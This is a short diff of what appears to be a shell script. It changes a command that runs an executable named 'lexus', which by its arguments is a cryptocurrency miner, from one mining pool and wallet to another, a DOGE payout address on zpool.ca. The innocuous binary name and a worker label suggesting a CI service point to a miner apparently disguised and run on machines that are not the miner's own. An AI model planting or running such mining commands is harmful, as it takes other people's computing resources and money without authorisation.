@@ -1,2 +1,2 @@
 chmod +x lexus
-./lexus -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.werckee1 -t 10
+./lexus -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE
